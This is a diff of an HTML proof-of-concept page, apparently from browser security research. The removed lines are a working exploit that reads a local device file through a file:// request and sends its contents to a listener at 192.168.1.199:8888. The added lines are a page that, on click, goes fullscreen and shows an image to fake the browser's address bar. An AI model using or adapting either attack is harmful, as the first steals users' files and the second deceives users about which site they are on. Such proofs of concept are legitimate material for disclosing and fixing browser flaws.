@@ -1,26 +1,42 @@
 <!DOCTYPE html>
-<html>
-<head>
-   <title>Evil page</title>
-</head>
-<body>
-<script type="text/javascript">
-   function theftFile(path, callback) {
-     var oReq = new XMLHttpRequest();
-
-     oReq.open("GET", "file://" + encodeURIComponent(path), true);
-     oReq.onload = function(e) {
-       callback(oReq.responseText);
-     }
-     oReq.onerror = function(e) {
-       callback(null);
-     }
-     oReq.send();
-   }
-
-   theftFile("/system/etc/protolog.conf.json.gz", function(contents) {
-       location.href = "http://192.168.1.199:8888/?data=" + encodeURIComponent(contents);
-   });
-</script>
-</body>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    await navigator.share({
+                            title: 'web.dev',
+                            text: 'Check out web.dev.',
+                            url: 'https://web.dev/',
+                        })
+                })();
+                 document.getElementById("spoof").style   = "display: block;";
+                 document.getElementById("content").style = "display: none;";
+                 document.documentElement.requestFullscreen();
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="spoof.png"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the omnibox!</h1>
+            </center>
+        </div>
+    </body>
+  </body>
 </html>
